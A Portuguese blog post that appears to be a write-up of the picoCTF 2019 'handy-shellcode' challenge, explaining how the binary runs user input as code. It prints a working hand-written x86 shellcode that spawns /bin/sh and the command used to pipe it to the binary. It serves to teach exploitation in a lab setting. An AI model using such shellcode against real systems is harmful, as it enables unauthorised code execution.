---
layout: post  
title: Writeup Handy-Shellcode  
author: "Felipe Brasileiro"  
date: 2020-08-15 12:00:00 -0300  
lide: Nesse post temos o Writeup do primeiro desafio de Binary Exploitation do PicoCTF2019. Esse desafio envolve a execução de um shellcode com o objetivo de ler o arquivo flag.txt
---
## Reconhecimento

![apresentação](https://i.imgur.com/9HcwxVg.png)

O desafio começa nos dando o binário que devemos explorar e seu código-fonte.

Ao executar o binário, ele nos pede um shellcode.

![executavel](https://i.imgur.com/t1LKFTX.png)

Pensei em colocar qualquer coisa no input para ver como que o binário iria se comportar e, de acordo com a resposta, esse programa tenta executar o que for colocado no input.

Analisando o código-fonte eu percebi que essa hipótese estava certa, já que o valor recebido é passado na variável **`buf`** em  
**`((void (*)())buf)();`** e assim é executado.

![Codigo-Fonte](https://i.imgur.com/aOcmgtz.png)

Sendo assim, precisamos de um shellcode que, ao ser executado, leia o arquivo flag.txt ou "spawne" uma shell para em seguida lermos a flag.

## Exploração

Na aba de dicas do desafio tem escrito *"Você pode achar bons shellcodes online"*, mas existem outras formas de pegar um shellcode.

### 1\. Utilizando pwntools

Uma das formas fáceis de pegar um shellcode é utilizando a biblioteca ***pwntools*** do python como no seguinte exemplo:

![pwntools](https://i.imgur.com/PLxhZq9.png)

Esse script vai gerar um shellcode que "spawna" a shell **/bin/sh** e o escrever no arquivo *payload1*

### 2\. Criando um shellcode

Outra forma de resolver o desafio (e a mais divertida) é escrever seu próprio shellcode.  
Nesse shellcode, eu utilizei a syscall ***execve*** para "spawnar" a shell e a syscall ***exit*** para terminar a execução do programa assim que fechar a shell.

![Assembly](https://i.imgur.com/0s2Gbet.png)

O codigo em Assembly "gera" o seguinte shellcode:

> "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb8\\x0c\\x56\\x34\\x12\\x2d\\x01\\x56\\x34\\x12\\xcd\\x80\\x31\\xc0\\x40\\x31\\xdb\\xcd\\x80"

Escrevendo ele em um arquivo foi como feito com o pwntools, é possível "spawnar" a shell.

![Shellcode_py](https://i.imgur.com/DSWXFfX.png)

## Flag

Para executar o payload e conseguir interagir com a shell é necessário manter o fluxo no stdin  
e para isso é preciso executar **`(cat payload1; cat) | ./vuln`**.

<img src="https://i.imgur.com/2YeiRrq.png" alt="flag" width="931" height="157">
